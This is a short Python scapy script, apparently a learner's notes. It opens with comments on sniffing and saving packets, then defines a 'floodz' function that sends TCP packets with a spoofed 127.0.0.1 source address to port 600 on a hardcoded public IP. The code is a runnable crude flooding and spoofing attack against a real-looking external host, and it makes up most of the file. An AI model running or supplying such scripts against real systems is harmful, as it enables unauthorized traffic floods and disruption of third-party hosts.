# In scapy, scapy-> ls(), lsc(), conf.
# help(command)
# pack_ = IP(dst="dgtsec.com",ttl=10)
# pack_show()
# conf.color_theme=ColorOnBlackTheme()
# sniffer_ = sniff(iface="31mMicrosoft Wi-Fi Direct Virtual Adapter #3", count=15)
# sniffer_.show()
# sniffer_[5].load()
# hexdump(sniffer_.load())
# Can use filter in sniffer to display certain elements only
# wrpcap("dgt.cap",sniffer)
# rdpcap("dgt.cap")

from scapy.all import *

def floodz(source,target):
	for source_p in range(100,150):
		IPlayer = IP(src=source, dst=target)
		TCPlayer = TCP(sport=source_p, dport=600)
		pkt = IPlayer/TCPlayer
		send(pkt)

source = "127.0.0.1"
target = "162.241.24.197"
floodz(source,target)